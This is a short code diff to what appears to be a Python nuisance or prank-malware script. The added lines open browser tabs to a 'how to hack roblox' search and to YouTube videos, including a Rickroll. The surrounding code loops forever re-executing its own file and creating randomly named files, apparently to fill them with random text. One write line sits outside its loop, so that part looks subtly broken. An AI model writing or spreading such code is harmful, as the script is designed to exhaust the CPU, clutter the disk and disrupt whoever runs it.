@@ -3,7 +3,24 @@ import string
 import os
 import ctypes
 import time
+import webbrowser
 
+
+time.sleep(2)
+webbrowser.open("https://www.google.com/search?q=how+to+hack+roblox&oq=how+to+hack+roblox&aqs=chrome..69i57j0l5j0i433j0l3.6662j1j7&sourceid=chrome&ie=UTF-8", new=1)
+
+
+time.sleep(3)
+webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", new=1)
+
+
+time.sleep(4)
+webbrowser.open("https://www.youtube.com/watch?v=cB4dYfFgaME", new=1)
+
+
+
+
+time.sleep(15)
 while 1:
     exec(open('main.py').read())
 
@@ -13,6 +30,7 @@ random_string = "".join(random.choice(string.ascii_letters) for i in range(lengt
 length_of_string2 = random.choice(range(1, 100000))
 random_string2 = "".join(random.choice(string.ascii_letters) for i in range(length_of_string2))
 
+time.sleep(10)
 while 1:
   f = open(random_string, "w+")
 f.write(random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2+random_string2+'\n'+random_string2)
